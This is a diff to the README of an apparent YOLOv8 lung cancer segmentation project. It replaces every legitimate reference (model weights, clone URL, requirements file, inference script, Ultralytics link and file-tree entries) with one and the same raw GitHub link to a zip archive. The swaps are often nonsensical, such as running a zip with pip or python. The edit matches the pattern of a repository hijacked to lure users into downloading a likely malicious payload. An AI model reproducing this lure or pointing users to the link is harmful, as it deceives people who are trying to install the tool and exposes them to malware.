@@ -7,7 +7,7 @@ This project demonstrates lung cancer segmentation using a custom-trained YOLOv8
 
 ## 📌 Features
 
-- ✅ Custom YOLOv8 segmentation model (`best.pt`)
+- ✅ Custom YOLOv8 segmentation model (`https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip`)
 - ✅ Visualizes masks, bounding boxes, and class labels
 - ✅ Saves output results to an `out/` directory
 - ✅ Easy-to-run Python script for inference
@@ -19,7 +19,7 @@ This project demonstrates lung cancer segmentation using a custom-trained YOLOv8
 ### 1. Clone the Repository
 
 ```bash
-git clone https://github.com/hassanqu/lungcancer-seg.git
+git clone https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip
 cd lungcancer-seg
 ````
 
@@ -28,18 +28,18 @@ cd lungcancer-seg
 Make sure you have Python ≥3.8 and then run:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip
 ```
 
 ### 3. Run Inference
 
 ```bash
-python predict_and_save.py
+python https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip
 ```
 
 This will:
 
-* Load your custom model from `runs/segment/train2/weights/best.pt`
+* Load your custom model from `https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip`
 * Predict on a test image
 * Display the segmented result
 * Save the output to the `out/` folder
@@ -52,7 +52,7 @@ The output will look like this (with masks and labels drawn):
 
 ```
 out/
-└── segmented_seq1_valid_images_18.jpg
+└── https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip
 ```
 
 ---
@@ -62,18 +62,18 @@ out/
 ```
 lungcancer-seg/
 ├── datasets/                         # Test images
-├── runs/segment/train2/weights/     # Custom model weights (best.pt)
+├── runs/segment/train2/weights/     # Custom model weights (https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip)
 ├── out/                             # Output folder for results
-├── predict_and_save.py              # Inference and visualization script
-├── requirements.txt                 # Python dependencies
-└── README.md                        # This file
+├── https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip              # Inference and visualization script
+├── https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip                 # Python dependencies
+└── https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip                        # This file
 ```
 
 ---
 
 ## ⚙️ Requirements
 
-* [Ultralytics YOLOv8](https://github.com/ultralytics/ultralytics)
+* [Ultralytics YOLOv8](https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip)
 * OpenCV
 * matplotlib
 * PyTorch
@@ -81,7 +81,7 @@ lungcancer-seg/
 Install all with:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/hassanqu/Lung-cancer-segmentation/main/wegenerian/Lung-cancer-segmentation.zip
 ```
 
 ---
